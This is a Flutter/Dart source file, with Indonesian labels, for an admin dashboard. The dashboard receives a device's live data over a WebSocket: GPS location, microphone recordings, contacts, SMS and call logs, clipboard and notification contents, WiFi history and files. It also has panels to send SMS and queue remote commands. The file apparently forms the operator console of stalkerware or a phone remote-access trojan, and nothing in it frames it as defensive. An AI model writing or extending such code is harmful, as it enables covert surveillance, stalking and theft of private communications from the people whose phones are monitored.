import 'package:flutter/material.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'dart:convert';

class AdminUserDetailPage extends StatefulWidget {
  final String userId; // unique user id

  const AdminUserDetailPage({super.key, required this.userId});

  @override
  State<AdminUserDetailPage> createState() => _AdminUserDetailPageState();
}

class _AdminUserDetailPageState extends State<AdminUserDetailPage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  late WebSocketChannel channel;

  // Realtime data
  LatLng? currentLocation;
  List<Map<String, dynamic>> gpsLogs = [];
  List<Map<String, dynamic>> micRecordings = [];
  List<Map<String, dynamic>> contacts = [];
  List<Map<String, dynamic>> smsLogs = [];
  List<Map<String, dynamic>> callLogs = [];
  List<Map<String, dynamic>> apps = [];
  List<Map<String, dynamic>> permissions = [];
  List<Map<String, dynamic>> clipboardLogs = [];
  List<Map<String, dynamic>> notificationLogs = [];
  List<Map<String, dynamic>> wifiLogs = [];
  List<Map<String, dynamic>> fileExplorer = [];
  List<Map<String, dynamic>> commandQueue = [];

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 13, vsync: this);

    // Ganti dengan endpoint WebSocket backend Anda:
    channel = WebSocketChannel.connect(
      Uri.parse('wss://your-backend.com/ws/${widget.userId}'),
    );
    channel.stream.listen((message) {
      final data = jsonDecode(message);
      switch (data['type']) {
        case 'gps':
          setState(() {
            currentLocation = LatLng(data['lat'], data['lon']);
            gpsLogs.insert(
              0,
              {
                "time": data['time'],
                "lat": data['lat'],
                "lon": data['lon'],
                "address": data['address'] ?? "",
              },
            );
          });
          break;
        case 'mic':
          setState(() {
            micRecordings.insert(0, Map<String, dynamic>.from(data['rec']));
          });
          break;
        case 'contacts':
          setState(() {
            contacts = List<Map<String, dynamic>>.from(data['contacts']);
          });
          break;
        case 'sms':
          setState(() {
            smsLogs.insert(0, Map<String, dynamic>.from(data['sms']));
          });
          break;
        case 'call':
          setState(() {
            callLogs.insert(0, Map<String, dynamic>.from(data['call']));
          });
          break;
        case 'apps':
          setState(() {
            apps = List<Map<String, dynamic>>.from(data['apps']);
          });
          break;
        case 'permissions':
          setState(() {
            permissions = List<Map<String, dynamic>>.from(data['permissions']);
          });
          break;
        case 'clipboard':
          setState(() {
            clipboardLogs.insert(0, Map<String, dynamic>.from(data['clip']));
          });
          break;
        case 'notif':
          setState(() {
            notificationLogs.insert(0, Map<String, dynamic>.from(data['notif']));
          });
          break;
        case 'wifi':
          setState(() {
            wifiLogs.insert(0, Map<String, dynamic>.from(data['wifi']));
          });
          break;
        case 'files':
          setState(() {
            fileExplorer = List<Map<String, dynamic>>.from(data['files']);
          });
          break;
        case 'command':
          setState(() {
            commandQueue.insert(0, Map<String, dynamic>.from(data['cmd']));
          });
          break;
        default:
      }
    });
  }

  @override
  void dispose() {
    channel.sink.close();
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Dashboard Admin - Detail User"),
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: const [
            Tab(text: "GPS Logging"),
            Tab(text: "Mic Recording"),
            Tab(text: "Contacts"),
            Tab(text: "SMS Logs"),
            Tab(text: "Send SMS"),
            Tab(text: "Call Logs"),
            Tab(text: "Installed Apps"),
            Tab(text: "Stub Permissions"),
            Tab(text: "Clipboard"),
            Tab(text: "Notifications"),
            Tab(text: "WiFi Networks"),
            Tab(text: "Files"),
            Tab(text: "Command Queue"),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          // 1. GPS Logging - realtime & jelas
          Column(
            children: [
              Expanded(
                flex: 2,
                child: currentLocation == null
                    ? const Center(child: Text('Menunggu data lokasi...'))
                    : FlutterMap(
                        options: MapOptions(
                          center: currentLocation,
                          zoom: 16.0,
                        ),
                        nonRotatedChildren: [
                          AttributionWidget.defaultWidget(
                            source: 'OpenStreetMap contributors',
                            onSourceTapped: null,
                          ),
                        ],
                        children: [
                          TileLayer(
                            urlTemplate:
                                'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
                          ),
                          MarkerLayer(
                            markers: [
                              Marker(
                                width: 40,
                                height: 40,
                                point: currentLocation!,
                                child: const Icon(Icons.location_pin,
                                    color: Colors.red, size: 40),
                              ),
                            ],
                          ),
                        ],
                      ),
              ),
              const SizedBox(height: 8),
              const Text(
                "Log Lokasi (Realtime)",
                style: TextStyle(
                    fontWeight: FontWeight.bold, color: Colors.blueAccent),
              ),
              Expanded(
                flex: 1,
                child: ListView.builder(
                  itemCount: gpsLogs.length,
                  itemBuilder: (_, i) {
                    final l = gpsLogs[i];
                    return ListTile(
                      leading: const Icon(Icons.my_location),
                      title: Text(
                          "${l['lat']}, ${l['lon']} (${l['address'] ?? ''})"),
                      subtitle: Text(l['time']),
                    );
                  },
                ),
              ),
            ],
          ),
          // 2. Microphone Recording
          ListView(
            children: [
              const ListTile(
                title: Text("Rekaman Suara (Mic)", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              ...micRecordings.map(
                (rec) => ListTile(
                  leading: const Icon(Icons.mic),
                  title: Text(rec['file'] ?? ""),
                  subtitle: Text(rec['time'] ?? ""),
                  trailing: IconButton(
                    icon: const Icon(Icons.download),
                    onPressed: () {
                      // TODO: Implement download
                    },
                  ),
                ),
              ),
            ],
          ),
          // 3. Contacts dengan label
          ListView(
            children: [
              const ListTile(
                title: Text("Daftar Kontak", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Nama Kontak")),
                  DataColumn(label: Text("Nomor Telepon")),
                ],
                rows: contacts
                    .map(
                      (c) => DataRow(cells: [
                        DataCell(Text(c['name'] ?? "")),
                        DataCell(Text(c['phone'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 4. SMS Logs dengan label
          ListView(
            children: [
              const ListTile(
                title: Text("Riwayat SMS", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Tipe SMS")),
                  DataColumn(label: Text("Nomor Pengirim/Penerima")),
                  DataColumn(label: Text("Isi Pesan")),
                  DataColumn(label: Text("Waktu")),
                ],
                rows: smsLogs
                    .map(
                      (s) => DataRow(cells: [
                        DataCell(Text(s['direction'] == 'IN' ? 'Masuk' : 'Keluar')),
                        DataCell(Text(s['direction'] == 'IN' ? s['from'] : s['to'])),
                        DataCell(Text(s['body'] ?? "")),
                        DataCell(Text(s['time'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 5. Send SMS
          Padding(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              children: [
                const Text("Kirim SMS ke user", style: TextStyle(fontWeight: FontWeight.bold)),
                const SizedBox(height: 12),
                TextField(decoration: const InputDecoration(labelText: "Nomor Tujuan")),
                TextField(
                  decoration: const InputDecoration(labelText: "Isi Pesan"),
                  maxLines: 2,
                ),
                const SizedBox(height: 12),
                ElevatedButton(onPressed: () {/* TODO: Send SMS */}, child: const Text("Kirim SMS")),
              ],
            ),
          ),
          // 6. Call Logs dengan label
          ListView(
            children: [
              const ListTile(
                title: Text("Riwayat Panggilan", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Tipe Panggilan")),
                  DataColumn(label: Text("Nomor")),
                  DataColumn(label: Text("Durasi (detik)")),
                  DataColumn(label: Text("Waktu")),
                ],
                rows: callLogs
                    .map(
                      (c) => DataRow(cells: [
                        DataCell(Text(
                          c['type'] == 'INCOMING'
                              ? 'Masuk'
                              : c['type'] == 'OUTGOING'
                                  ? 'Keluar'
                                  : 'Tidak Terjawab',
                        )),
                        DataCell(Text(c['number'] ?? "")),
                        DataCell(Text("${c['duration'] ?? ""}")),
                        DataCell(Text(c['time'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 7. View Installed Apps
          ListView(
            children: [
              const ListTile(
                title: Text("Aplikasi Terpasang", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Nama Aplikasi")),
                  DataColumn(label: Text("Package")),
                  DataColumn(label: Text("Versi")),
                ],
                rows: apps
                    .map(
                      (a) => DataRow(cells: [
                        DataCell(Text(a['app'] ?? "")),
                        DataCell(Text(a['package'] ?? "")),
                        DataCell(Text(a['version'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 8. View Stub Permissions
          ListView(
            children: [
              const ListTile(
                title: Text("Status Permission", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Permission")),
                  DataColumn(label: Text("Status")),
                  DataColumn(label: Text("Update Terakhir")),
                ],
                rows: permissions
                    .map(
                      (p) => DataRow(cells: [
                        DataCell(Text(p['permission'] ?? "")),
                        DataCell(Text(
                          p['status'] == true ? 'Granted' : 'Denied',
                          style: TextStyle(
                              color: p['status'] == true ? Colors.green : Colors.red),
                        )),
                        DataCell(Text(p['updated'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 9. Live Clipboard Logging
          ListView(
            children: [
              const ListTile(
                title: Text("Clipboard Log", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              ...clipboardLogs.map(
                (clip) => ListTile(
                  leading: const Icon(Icons.copy),
                  title: Text(clip['content'] ?? ""),
                  subtitle: Text(clip['time'] ?? ""),
                ),
              ),
            ],
          ),
          // 10. Live Notification Logging
          ListView(
            children: [
              const ListTile(
                title: Text("Notifikasi Realtime", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              ...notificationLogs.map(
                (notif) => ListTile(
                  leading: const Icon(Icons.notifications),
                  title: Text(notif['title'] ?? ""),
                  subtitle: Text("${notif['body'] ?? ""} (${notif['time'] ?? ""})"),
                ),
              ),
            ],
          ),
          // 11. View WiFi Networks (logs previously seen)
          ListView(
            children: [
              const ListTile(
                title: Text("Log WiFi Networks", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("SSID")),
                  DataColumn(label: Text("Waktu")),
                  DataColumn(label: Text("Lokasi")),
                ],
                rows: wifiLogs
                    .map(
                      (w) => DataRow(cells: [
                        DataCell(Text(w['ssid'] ?? "")),
                        DataCell(Text(w['time'] ?? "")),
                        DataCell(Text(w['location'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 12. File Explorer & Downloader
          ListView(
            children: [
              const ListTile(
                title: Text("File Explorer", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Path")),
                  DataColumn(label: Text("Ukuran")),
                  DataColumn(label: Text("Download")),
                ],
                rows: fileExplorer
                    .map(
                      (f) => DataRow(cells: [
                        DataCell(Text(f['path'] ?? "")),
                        DataCell(Text(f['size'] ?? "")),
                        DataCell(
                          IconButton(
                            icon: const Icon(Icons.download),
                            onPressed: () {
                              // TODO: Download file
                            },
                          ),
                        ),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
          // 13. Command Queuing
          ListView(
            children: [
              const ListTile(
                title: Text("Command Queue", style: TextStyle(fontWeight: FontWeight.bold)),
              ),
              DataTable(
                columns: const [
                  DataColumn(label: Text("Perintah")),
                  DataColumn(label: Text("Status")),
                  DataColumn(label: Text("Waktu")),
                ],
                rows: commandQueue
                    .map(
                      (cmd) => DataRow(cells: [
                        DataCell(Text(cmd['command'] ?? "")),
                        DataCell(Text(cmd['status'] ?? "")),
                        DataCell(Text(cmd['time'] ?? "")),
                      ]),
                    )
                    .toList(),
              ),
            ],
          ),
        ],
      ),
    );
  }
}